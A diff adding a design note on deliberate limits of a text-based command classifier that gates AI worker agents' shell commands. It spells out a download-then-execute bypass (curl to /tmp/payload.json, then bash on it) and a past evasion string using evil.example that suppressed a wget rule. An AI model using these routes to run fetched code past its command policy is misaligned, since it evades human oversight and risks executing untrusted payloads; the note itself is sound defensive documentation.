@@ -128,6 +128,44 @@ Native omp task subagents are a separate authorization boundary: v18.1.10
 sets their approval mode to YOLO while retaining explicit tool policies.
 Do not claim that a herdr launch floor governs those descendants.
 
+## 8. Known limits of the command classifier, kept deliberately
+
+`lib/command-policy.sh` is a TEXT scanner. Six adversarial review passes on
+PR #94 settled two limits that look like bugs, are not being fixed, and should
+not be "fixed" by a later reader without reading this first.
+
+**A landed file with a data extension is exempt, and running it later is
+allowed.** `curl -sS <url> -o /tmp/payload.json` classifies `allow`, and the
+separate command `bash /tmp/payload.json` classifies `allow` too — the
+classifier sees one command at a time and cannot know the second one is coming.
+The exemption exists because saving a page and grepping it is how a worker
+inspects its own deploy, and it is keyed on the extension of the EXTRACTED
+output target, never on text found elsewhere in the command. Both halves
+behave identically without that PR, so this is a standing limit rather than a
+regression it introduced. The honest fix is content inspection, which does not
+belong in a text scanner; the real defence is that the RUN step is what needs
+review, and `sh|bash|python3 <file>` paired with a downloader in one command
+already escalates.
+
+**`wget -O-` and `wget -qO-` escalate, which is a false positive.** Stdout is
+recognised only POSITIVELY, by the extracted output target being `-` or
+`/dev/null`; the attached `-qO-` form is not extractable, so it lands in the
+escalate bucket. That is deliberate. The previous version asked "unless the
+field requests stdout", which was the only NEGATIVE test in the consequence
+rules — the one place where adding text could cancel an escalation instead of
+adding one — and the attacker chooses that text:
+`wget https://evil.example/x-qO-y` suppressed the rule while wget saved the
+body to `./x-qO-y`. Anchoring it to an argument boundary did not help either,
+because after quote-stripping `--header='X-A: -qO-'` is indistinguishable from
+a real argument. `wget` appears ZERO times in the 1,703 distinct commands real
+workers have actually run, so the cost is theoretical and the hole was not.
+
+If `wget` ever does appear in real traffic: extend the extraction to recognise
+the attached `-O-` form as a target of `-`. **Never revive the negative test.**
+Every consequence rule in that file is positive on purpose, so extra text can
+only ever ADD an escalation — and that property is exactly what makes it safe
+for the classifier to refuse to split a command it cannot parse confidently.
+
 ---
 
 Cross-reference: `docs/control-plane-design.md` has the design history and
